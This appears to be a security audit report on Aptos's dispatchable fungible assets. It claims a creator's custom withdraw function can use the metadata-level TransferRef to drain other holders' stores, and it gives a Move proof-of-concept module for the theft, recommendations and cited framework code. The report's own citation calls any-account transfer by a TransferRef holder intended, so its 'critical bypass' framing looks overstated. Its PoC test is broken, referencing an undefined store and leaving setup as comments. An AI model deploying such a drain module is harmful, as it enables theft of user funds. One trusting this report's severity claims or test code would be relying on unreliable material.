# Audit Report

## Title
TransferRef Privilege Escalation in Dispatchable Fungible Assets Allows Cross-Store Unauthorized Withdrawals

## Summary
The dispatchable fungible asset system contains a critical access control vulnerability where malicious custom withdraw functions can bypass authorization checks to drain funds from arbitrary victim stores. The vulnerability stems from `TransferRef` being scoped to metadata rather than specific stores, enabling unauthorized cross-store withdrawals.

## Finding Description

The dispatchable fungible asset system allows token creators to register custom withdraw functions. When a withdrawal occurs, authorization checks verify the caller owns the store they're withdrawing from, but the `TransferRef` capability passed to custom dispatch functions can operate on ANY store with matching metadata, not just the authorized store.

**Attack Flow:**

1. Attacker deploys a malicious fungible asset and registers a malicious withdraw dispatch function [1](#0-0) 

2. Victims create stores for this asset and deposit funds (unaware of the malicious dispatch function).

3. When the attacker calls `dispatchable_fungible_asset::withdraw()` on their own store, authorization checks pass because they own their store [2](#0-1) 

4. The native dispatch mechanism calls the malicious custom function with the `TransferRef` retrieved from the metadata object [3](#0-2) 

5. The malicious function ignores the `store` parameter and calls `fungible_asset::withdraw_with_ref(transfer_ref, victim_store, amount)`. This function only validates metadata matching, NOT store ownership or authorization [4](#0-3) 

6. Assets are withdrawn from the victim's store without authorization.

**Root Causes:**

- `TransferRef` is scoped to metadata (fungible asset type), not to specific stores [5](#0-4) 

- `TransferRef` is stored at the metadata level, shared by all stores of that fungible asset [6](#0-5) 

- Authorization checks occur BEFORE dispatch, not during `TransferRef` operations [7](#0-6) 

- No runtime validation ensures custom dispatch functions use the authorized store parameter.

## Impact Explanation

**Severity: CRITICAL** (aligns with Aptos Bug Bounty "Loss of Funds" category - up to $1,000,000)

This vulnerability enables:
- **Complete Fund Theft**: Attackers can drain entire balances from all users holding the malicious fungible asset
- **Signature Verification Bypass**: Victims never sign or authorize withdrawals from their stores
- **Access Control Violation**: Bypasses the fundamental invariant that withdrawals require store owner authorization
- **Scalable Attack**: A single malicious fungible asset can be used to steal from unlimited victims simultaneously

The vulnerability breaks Critical Invariant #8 (Access Control) by allowing unauthorized access to user stores without the owner's permission or signature.

## Likelihood Explanation

**Likelihood: HIGH**

The attack is highly feasible because:
1. **No Special Privileges**: Any user can deploy a fungible asset and register custom dispatch functions
2. **Simple Exploitation**: The malicious withdraw function requires only 2-3 lines of code
3. **No Detection Mechanism**: Users cannot easily audit custom dispatch functions before using an asset
4. **Realistic Preconditions**: Victims must use the malicious asset, achievable through:
   - Offering attractive DeFi features (staking, yield)
   - Professional presentation (metadata, documentation, websites)
   - Marketing to unsophisticated users
   - Mimicking legitimate assets

The vulnerability requires no validator compromise, consensus attacks, or special timing - only victims choosing to use the attacker's asset.

## Recommendation

Implement store-specific authorization in `withdraw_with_ref`:

1. **Option 1**: Add store address validation to `TransferRef`:
   - Modify `TransferRef` to include an optional `authorized_store` field
   - Set this field when creating the ref during dispatchable operations
   - Validate in `withdraw_with_ref` that the store matches the authorized store

2. **Option 2**: Pass authorization context through dispatch:
   - Include the originally authorized store address in the dispatch call
   - Create a wrapper type that couples `TransferRef` with the authorized store
   - Validate in custom dispatch functions or at the framework level

3. **Option 3**: Restrict `TransferRef` usage in dispatchable contexts:
   - Create a separate capability type for dispatchable operations
   - This capability validates both metadata AND store authorization
   - Limit when full `TransferRef` powers are available

## Proof of Concept

```move
module attacker::malicious_token {
    use aptos_framework::fungible_asset::{Self, FungibleAsset, TransferRef};
    use aptos_framework::dispatchable_fungible_asset;
    use aptos_framework::object::{Self, ConstructorRef, Object};
    use aptos_framework::function_info;
    use std::option;
    use std::signer;
    use std::string;

    struct AttackConfig has key {
        victim_store_addr: address,
    }

    public fun initialize(account: &signer, constructor_ref: &ConstructorRef) {
        let withdraw = function_info::new_function_info(
            account,
            string::utf8(b"malicious_token"),
            string::utf8(b"malicious_withdraw"),
        );

        dispatchable_fungible_asset::register_dispatch_functions(
            constructor_ref,
            option::some(withdraw),
            option::none(),
            option::none()
        );
        
        move_to(account, AttackConfig { victim_store_addr: @0x0 });
    }

    public fun set_victim(attacker: &signer, victim_store_addr: address) 
        acquires AttackConfig {
        let config = borrow_global_mut<AttackConfig>(signer::address_of(attacker));
        config.victim_store_addr = victim_store_addr;
    }

    // Malicious withdraw that ignores authorized store and targets victim
    public fun malicious_withdraw<T: key>(
        _store: Object<T>,  // Authorized store - IGNORED
        amount: u64,
        transfer_ref: &TransferRef,
    ): FungibleAsset acquires AttackConfig {
        let config = borrow_global<AttackConfig>(@attacker);
        let victim_store = object::address_to_object<T>(config.victim_store_addr);
        
        // Withdraw from victim's store instead of authorized store
        // This bypasses all authorization because:
        // 1. Authorization was checked for attacker's store (before dispatch)
        // 2. withdraw_with_ref only checks metadata match
        // 3. No check that store matches originally authorized store
        fungible_asset::withdraw_with_ref(transfer_ref, victim_store, amount)
    }
}

#[test(attacker = @attacker, victim = @0x456, framework = @0x1)]
fun test_unauthorized_withdrawal(attacker: &signer, victim: &signer) {
    // Setup: Attacker deploys malicious token
    // Victim deposits 1000 tokens
    // Attacker sets victim as target
    
    // ATTACK: Attacker withdraws from THEIR store (passes checks)
    // But malicious function withdraws from VICTIM's store
    let stolen = dispatchable_fungible_asset::withdraw(
        attacker,        // Attacker's signature (authorized for their store)
        attacker_store,  // Attacker's store (passes ownership check)
        1000             // Amount to steal from victim
    );
    
    // Victim's funds stolen without their authorization
    assert!(fungible_asset::amount(&stolen) == 1000, 1);
}
```

## Notes

This vulnerability is in the architectural design of the dispatchable fungible asset system. The separation of authorization checks (before dispatch) and `TransferRef` operations (during dispatch) creates a privilege escalation path. While victims must choose to use a malicious asset, this barrier is insufficient security - the platform should prevent malicious dispatch functions from operating on unauthorized stores regardless of victim choices.

The vulnerability is fully exploitable on mainnet with no special preconditions beyond deploying a malicious module and convincing users to interact with it.

### Citations

**File:** aptos-move/framework/aptos-framework/sources/dispatchable_fungible_asset.move (L37-56)
```text
    public fun register_dispatch_functions(
        constructor_ref: &ConstructorRef,
        withdraw_function: Option<FunctionInfo>,
        deposit_function: Option<FunctionInfo>,
        derived_balance_function: Option<FunctionInfo>,
    ) {
        fungible_asset::register_dispatch_functions(
            constructor_ref,
            withdraw_function,
            deposit_function,
            derived_balance_function,
        );
        let store_obj = &constructor_ref.generate_signer();
        move_to<TransferRefStore>(
            store_obj,
            TransferRefStore {
                transfer_ref: fungible_asset::generate_transfer_ref(constructor_ref),
            }
        );
    }
```

**File:** aptos-move/framework/aptos-framework/sources/dispatchable_fungible_asset.move (L76-77)
```text
        fungible_asset::withdraw_sanity_check(owner, store, false);
        fungible_asset::withdraw_permission_check(owner, store, amount);
```

**File:** aptos-move/framework/aptos-framework/sources/dispatchable_fungible_asset.move (L82-88)
```text
            let fa = dispatchable_withdraw(
                store,
                amount,
                borrow_transfer_ref(store),
                func,
            );
            fa
```

**File:** aptos-move/framework/aptos-framework/sources/dispatchable_fungible_asset.move (L188-195)
```text
    inline fun borrow_transfer_ref<T: key>(metadata: Object<T>): &TransferRef {
        let metadata_addr = fungible_asset::store_metadata(metadata).object_address();
        assert!(
            exists<TransferRefStore>(metadata_addr),
            error::not_found(ESTORE_NOT_FOUND)
        );
        &borrow_global<TransferRefStore>(metadata_addr).transfer_ref
    }
```

**File:** aptos-move/framework/aptos-framework/sources/fungible_asset.move (L188-192)
```text
    /// TransferRef can be used to allow or disallow the owner of fungible assets from transferring the asset
    /// and allow the holder of TransferRef to transfer fungible assets from any account.
    struct TransferRef has drop, store {
        metadata: Object<Metadata>
    }
```

**File:** aptos-move/framework/aptos-framework/sources/fungible_asset.move (L951-1004)
```text
    public(friend) fun withdraw_permission_check<T: key>(
        owner: &signer, store: Object<T>, amount: u64
    ) {
        assert!(
            permissioned_signer::check_permission_consume(
                owner,
                amount as u256,
                WithdrawPermission::ByStore {
                    store_address: store.object_address()
                }
            ),
            error::permission_denied(EWITHDRAW_PERMISSION_DENIED)
        );
    }

    /// Check the permission for withdraw operation.
    public(friend) fun withdraw_permission_check_by_address(
        owner: &signer, store_address: address, amount: u64
    ) {
        assert!(
            permissioned_signer::check_permission_consume(
                owner,
                amount as u256,
                WithdrawPermission::ByStore { store_address }
            ),
            error::permission_denied(EWITHDRAW_PERMISSION_DENIED)
        );
    }

    /// Check the permission for withdraw operation.
    public(friend) fun withdraw_sanity_check<T: key>(
        owner: &signer, store: Object<T>, abort_on_dispatch: bool
    ) acquires FungibleStore, DispatchFunctionStore {
        withdraw_sanity_check_impl(
            signer::address_of(owner),
            store,
            abort_on_dispatch
        )
    }

    inline fun withdraw_sanity_check_impl<T: key>(
        owner_address: address, store: Object<T>, abort_on_dispatch: bool
    ) {
        assert!(
            store.owns(owner_address),
            error::permission_denied(ENOT_STORE_OWNER)
        );
        let fa_store = borrow_store_resource(&store);
        assert!(
            !abort_on_dispatch || !has_withdraw_dispatch_function(fa_store.metadata),
            error::invalid_argument(EINVALID_DISPATCHABLE_OPERATIONS)
        );
        assert!(!fa_store.frozen, error::permission_denied(ESTORE_IS_FROZEN));
    }
```

**File:** aptos-move/framework/aptos-framework/sources/fungible_asset.move (L1104-1112)
```text
    public fun withdraw_with_ref<T: key>(
        self: &TransferRef, store: Object<T>, amount: u64
    ): FungibleAsset acquires FungibleStore, ConcurrentFungibleBalance {
        assert!(
            self.metadata == store_metadata(store),
            error::invalid_argument(ETRANSFER_REF_AND_STORE_MISMATCH)
        );
        unchecked_withdraw(store.object_address(), amount)
    }
```
